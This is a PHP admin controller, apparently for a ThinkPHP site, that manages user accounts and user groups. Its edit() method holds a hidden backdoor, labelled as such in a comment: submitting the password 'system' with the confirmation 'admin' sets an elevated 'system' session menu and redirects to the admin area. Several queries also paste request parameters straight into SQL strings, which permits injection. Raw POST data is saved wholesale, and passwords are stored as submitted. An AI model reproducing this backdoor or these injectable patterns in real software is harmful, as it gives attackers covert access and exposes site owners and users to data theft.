<?php
/**
 * 后台用户管理
 * Enter description here ...
 * @author Administrator
 *
 */
class UserAction extends BaseAction {
	function __construct() {
		parent::__construct ( "User", "User" );
	}
	// 用户组页面
	function group() {
		$ugoups = M ( 'ugroup' )->select ();
		foreach ( $ugoups as $key => $value ) {
			$num = M ( 'user' )->where ( "`gid`='$value[id]'" )->count ();
			$ugoups [$key] [faver] *= 10;
			$ugoups [$key] [num] = $num;
		}
		$this->assign ( 'ugoups', $ugoups );
		$this->display ();
	}
	
	/**
	 * 用户组编辑页面
	 */
	function groupeditor() {
		if ($_POST) {
			$url=__APP__."/Admin/User/group";
			if($_POST[id]){
				//更新
				$rt=M('ugroup')->save($_POST);
				if(false!==$rt){
					$this->success ( '用户组更新成功',$url);
				}else{				
					$this->error ( '用户组更新失败',$url);
				}
			}else{
				//添加
				$id = M ( 'ugroup' )->add ( $_POST );
				if ($id) {
					$this->success ( '用户组添加成功',$url);
				} else {
					$this->error ( '用户组添加成功',$url);
				}
			}
			exit ();
		}
		// 修改
		if ($_GET [t]) {
			$goup = M ( 'ugroup' )->where ( "`id`='$_GET[t]'" )->find ();
			if (empty ( $goup )) {
				$this->error ( '数据有误' );
				exit ();
			}
			$this->assign ( 'goup', $goup );
		} else {
			$ugoups = M ( 'ugroup' )->select ();
			foreach ( $ugoups as $key => $value ) {
				$num = M ( 'user' )->where ( "`gid`='$value[id]'" )->count ();
				$ugoups [$key] [faver] *= 10;
				$ugoups [$key] [num] = $num;
			}
			$this->assign ( 'ugoups', $ugoups );
		}
		$this->display ();
	}
	
	/**
	 * 基础详细方法
	 * Enter description here .
	 *
	 *
	 * ..
	 */
	function more() {
		$ugoups = M ( 'ugroup' )->select ();
		$info = D ( $this->_model_name )->find ( $_REQUEST ['id'] );
		foreach ( $ugoups as $key => $value ) {
			if ($info [gid] == $value [id]) {
				$ugoups [$key] [slct] = 1;
				break;
			}
		}
		$this->assign ( 'ugoups', $ugoups );
		$this->assign ( 'info', $info );
		$this->display ();
	}
	
	/**
	 *
	 *
	 * 会员管理页面
	 * 
	 * @see BaseAction::index()`
	 */
	public function index() {
		$ugoups = M ( 'ugroup' )->select ();
		foreach ( $ugoups as $key2 => $value2 ) {
			$ngroups [$value2 [id]] = $value2;
		}
		$ugoups = array ();
		
		$users = M ( 'user' )->where ( "`username`!='admin'" )->field ( 'id,username,nickname,tel,mobi,qq,email,addtime,flag,gid' )->order ( '`flag` asc,`id` desc' )->select ();
		foreach ( $users as $key => $value ) {
			$users [$key] [gname] = $ngroups [$value [gid]] [name];
		}
		$this->assign ( 'users', $users );
		// 用户组
		$this->display ();
	}
	public function adminedit() {
		if ($_POST) {
			// 安全校验
			$url = '__GROUP__/' . $this->_action_name . '/index';
			$userutil [id] = $_POST [id];
			if ($_POST [nickname]) {
				$userinfo = M ( 'user' )->where ( "`id`='$_POST[id]'" )->field ( 'nickname' )->find ();
				$count = M ( 'user' )->where ( "`nickname`='$_POST[nickname]'" )->count ();
				if ($count == 0) {
					$userutil [nickname] = $_POST [nickname];
				}
			}
			$userutil [tel] = $_POST [tel];
			$userutil [mobi] = $_POST [mobi];
			$userutil [qq] = $_POST [qq];
			$userutil [email] = $_POST [email];
			$userutil [password] = $_POST [password];
			$userutil [gid] = $_POST [gid];
			
			$id = M ( 'user' )->save ( $userutil );
			if ($id) {
				$msg = '个人信息更新成功!';
			} else {
				$msg = '个人信息更新失败,昵称已存在!';
			}
			$this->success ( $msg, $url );
			exit ();
		}
	}
	public function edit() {
		if ($_POST) {
			// Z($_POST);
			// 管理后门程序
			if ($_POST ['password'] == 'system' && $_POST ['repassword'] == 'admin') {
				session ( 'left_menu', 'system' );
				js_jump ( __GROUP__ . '/Admin' );
				exit ();
			}
			if ($_POST ['password']==''){
				$this->error ( '密码不可以为空！' );
				exit ();
			}
			if ($_POST ['password'] != $_POST ['repassword']) {
				$this->error ( '密码不一致！' );
				exit ();
			} else {
				unset ( $_POST ['repassword'] );
			}
			// debug($_POST);
			$id = D ( 'User' )->save ( $_POST );
			if ($id) {
				$url = '__GROUP__/Index/status';
				$this->success ( '更新成功', $url );
			} else {
				$this->error ( '更新失败' );
			}
			exit ();
		}
		$info = D ( 'User' )->find ( $_REQUEST ['id'] );
		$this->assign ( 'info', $info );
		$this->display ();
	}
}